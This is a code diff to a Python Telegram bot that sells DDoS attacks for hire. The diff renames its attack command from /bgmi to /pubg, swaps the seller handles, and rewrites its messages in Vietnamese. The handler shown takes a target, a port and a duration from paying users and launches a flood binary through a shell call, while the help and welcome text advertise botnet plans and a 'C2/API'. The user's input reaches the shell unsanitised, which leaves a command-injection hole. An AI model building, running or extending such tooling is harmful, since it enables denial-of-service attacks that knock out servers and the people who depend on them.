@@ -279,7 +279,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- @mesh213 KA KALA JADU"
+    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀 \n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: PUBG"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -288,7 +288,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['pubg'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -296,7 +296,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
+                response = "Một cuộc tấn công đang diễn ra. Vui lòng chờ."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -310,17 +310,17 @@ def handle_bgmi(message):
             if time > 600:
                 response = "Error: Time interval must be less than 600."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/pubg', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./pubg {target} {port} {time} 500"
                 process = subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"Attack successfully sent! Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "Usage :- /pubg <TARGET> <PORT> <TIME>"  # Updated command syntax
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @mesh213")
+        response = ("🚀 Bạn Không có quyền! 🚀\n\bạn không có quyền dụng lệnh /pubg. Vui lòng liên hệ @Xiaocoder để mua")
 
     bot.reply_to(message, response)
 
@@ -347,18 +347,15 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
-💥 /myinfo : TO Check Your WHOLE INFO.
+    help_text ='''Danh Sách Các Lệnh:
+ /pubg : Method Tấn Công Server PUBG
+ /rules : Xem quy định trước khi sử dụng !!
+ /mylogs : xem các cuộc tấn công gần đây của bạn.
+ /plan : Xem bảng giá và gói dịch vụ của botnet.
+/myinfo : THÔNG TIN CỦA BẠN .
 
-🤖 To See Admin Commands:
-💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @mesh213
-Official Channel :- https://t.me/+Pw7z83Ju54ljOGFl
+Buy From :- @xiaocoderz
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -373,9 +370,15 @@ Official Channel :- https://t.me/+Pw7z83Ju54ljOGFl
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
-🤖Try To Run This Command : /help 
-✅BUY :- @mesh213'''
+    response = f'''Welcome to Arthur DDoS Bot! 
+   
+    Tấn Công DDoS Miễn Phí Và Trả Phí
+
+Type /help to see the attack usage!
+
+----------------------------------------------
+
+Best C2/API Of 2024 -> @Xiaocoderz🚀'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
